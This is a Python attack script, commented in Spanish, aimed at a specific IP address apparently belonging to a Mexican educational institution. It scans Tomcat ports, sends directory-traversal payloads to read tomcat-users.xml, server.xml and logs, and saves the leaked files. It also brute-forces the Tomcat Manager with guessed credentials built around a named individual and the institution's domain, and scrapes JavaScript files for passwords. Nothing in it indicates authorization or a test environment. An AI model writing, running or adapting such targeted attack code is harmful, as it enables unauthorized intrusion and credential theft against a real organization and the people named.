# tomcat_full_scan.py
import requests
import socket
import threading
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import urllib3
import json
import time

# Desactivar warnings SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class TomcatScanner:
    def __init__(self, target):
        self.target = target
        self.base_urls = [
            f"http://{target}",
            f"https://{target}",
            f"http://{target}:8080",
            f"https://{target}:8443"
        ]
        self.found_paths = []
        self.credentials_found = []
        
    def scan_ports(self):
        """Escaneo de puertos específicos de Tomcat"""
        print("[+] Escaneando puertos Tomcat...")
        common_ports = [80, 443, 8080, 8009, 8005, 8443, 8081, 8090, 8088, 8888]
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((self.target.split(':')[0], port))
                if result == 0:
                    print(f"  ✅ Puerto {port} ABIERTO")
                sock.close()
            except:
                pass

    def check_tomcat_paths(self):
        """Verifica rutas comunes de Tomcat"""
        paths = [
            "/manager/html", "/manager/status", "/manager/jmxproxy",
            "/host-manager/html", "/docs/", "/examples/", "/jsp/",
            "/admin/", "/webdav/", "/servlets-examples/",
            "/jsp-examples/", "/tomcat-docs/", "/ROOT/", "/SITO/"
        ]
        
        for base_url in self.base_urls:
            print(f"\n[+] Probando {base_url}")
            for path in paths:
                try:
                    url = urljoin(base_url, path)
                    response = requests.get(url, verify=False, timeout=5)
                    
                    if response.status_code != 404:
                        print(f"  ✅ {path} - Status: {response.status_code}")
                        self.found_paths.append(url)
                        
                        # Buscar información sensible en respuestas
                        self.analyze_response(url, response)
                        
                except Exception as e:
                    pass

    def analyze_response(self, url, response):
        """Analiza respuestas para encontrar información sensible"""
        content = response.text.lower()
        
        # Buscar patrones de información sensible
        sensitive_patterns = [
            "password", "username", "user", "jdbc", "database",
            "tomcat-users", "server.xml", "web.xml", "context.xml",
            "hnieto", "utslp", "sito", "mysql", "oracle"
        ]
        
        for pattern in sensitive_patterns:
            if pattern in content:
                print(f"    🔍 '{pattern}' encontrado en {url}")

    def exploit_directory_traversal(self):
        """Explota Directory Traversal en Tomcat 6"""
        print("\n[+] Explotando Directory Traversal...")
        
        traversal_payloads = [
            "../../../../../../conf/tomcat-users.xml",
            "../../../../../../conf/server.xml",
            "../../../../../../logs/catalina.out",
            "../../../../../../webapps/ROOT/WEB-INF/web.xml",
            "../conf/tomcat-users.xml",
            "....//....//....//....//....//conf/tomcat-users.xml"
        ]
        
        vulnerable_endpoints = [
            "/examples/jsp/include/include.jsp?page=",
            "/examples/jsp/cal/cal2.jsp?time=",
            "/examples/jsp/snp/snoop.jsp?param="
        ]
        
        for endpoint in vulnerable_endpoints:
            for payload in traversal_payloads:
                for base_url in self.base_urls:
                    try:
                        url = urljoin(base_url, endpoint + payload)
                        response = requests.get(url, verify=False, timeout=5)
                        
                        if "tomcat" in response.text.lower() or "password" in response.text.lower():
                            print(f"  ✅ LEAK DE CONFIGURACIÓN: {url}")
                            
                            # Guardar archivo encontrado
                            filename = f"leaked_{payload.split('/')[-1]}_{int(time.time())}.txt"
                            with open(filename, 'w', encoding='utf-8') as f:
                                f.write(response.text)
                            print(f"    📁 Guardado como: {filename}")
                            
                    except Exception as e:
                        pass

    def brute_force_manager(self):
        """Fuerza bruta del Tomcat Manager"""
        print("\n[+] Probando credenciales Tomcat Manager...")
        
        # Credenciales basadas en tu análisis
        credentials = [
            ("hnieto", "utslp"), ("hnieto", "admin"), ("hnieto", "tomcat"),
            ("admin", "admin"), ("tomcat", "tomcat"), ("admin", "tomcat"),
            ("both", "tomcat"), ("role1", "role1"), ("sito", "sito"),
            ("hnieto", "utslp.edu.mx"), ("admin", "utslp")
        ]
        
        manager_urls = [
            "/manager/html", "/manager/status", "/manager/jmxproxy"
        ]
        
        for base_url in self.base_urls:
            for manager_url in manager_urls:
                url = urljoin(base_url, manager_url)
                
                for username, password in credentials:
                    try:
                        response = requests.get(url, auth=(username, password), verify=False, timeout=5)
                        
                        if response.status_code == 200:
                            print(f"  ✅ CREDENCIALES VÁLIDAS: {username}:{password} para {url}")
                            self.credentials_found.append({
                                "url": url,
                                "username": username,
                                "password": password
                            })
                    except:
                        pass

    def scan_js_files(self):
        """Analiza archivos JavaScript para encontrar credenciales"""
        print("\n[+] Analizando archivos JavaScript...")
        
        js_paths = [
            "/javascript/utilities.js",
            "/javascript/jquery/jquery-1.5.1.min.js",
            "/javascript/jquery/jquery-ui-1.8.2.min.js",
            "/javascript/scriptAnimaciones.js"
        ]
        
        for base_url in self.base_urls:
            for js_path in js_paths:
                try:
                    url = urljoin(base_url, js_path)
                    response = requests.get(url, verify=False, timeout=5)
                    
                    if response.status_code == 200:
                        print(f"  📜 Analizando: {url}")
                        
                        # Buscar patrones de credenciales
                        content = response.text
                        patterns = [
                            r'password\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
                            r'user\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
                            r'host\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
                            r'jdbc:mysql://([^"\']+)',
                            r'utslp\.edu\.mx',
                            r'hnieto'
                        ]
                        
                        for pattern in patterns:
                            import re
                            matches = re.findall(pattern, content, re.IGNORECASE)
                            if matches:
                                print(f"    🔍 Encontrado: {pattern} -> {matches}")
                                
                except Exception as e:
                    pass

    def run_full_scan(self):
        """Ejecuta escaneo completo"""
        print("=== ESCÁNER COMPLETO TOMCAT 6.0.53 ===")
        print(f"Objetivo: {self.target}\n")
        
        self.scan_ports()
        self.check_tomcat_paths()
        self.exploit_directory_traversal()
        self.brute_force_manager()
        self.scan_js_files()
        
        # Generar reporte
        self.generate_report()

    def generate_report(self):
        """Genera reporte final"""
        print("\n" + "="*50)
        print("📊 REPORTE FINAL DE ESCANEO")
        print("="*50)
        
        print(f"\n🔍 PATHS ENCONTRADOS ({len(self.found_paths)}):")
        for path in self.found_paths:
            print(f"  • {path}")
            
        print(f"\n🔑 CREDENCIALES ENCONTRADAS ({len(self.credentials_found)}):")
        for cred in self.credentials_found:
            print(f"  • {cred['username']}:{cred['password']} -> {cred['url']}")
            
        print(f"\n💾 ARCHIVOS GUARDADOS:")
        # Listar archivos de leakage guardados
        import os
        for file in os.listdir('.'):
            if file.startswith('leaked_'):
                print(f"  • {file}")

# Uso del scanner
if __name__ == "__main__":
    target = "189.254.143.102"
    scanner = TomcatScanner(target)
    scanner.run_full_scan()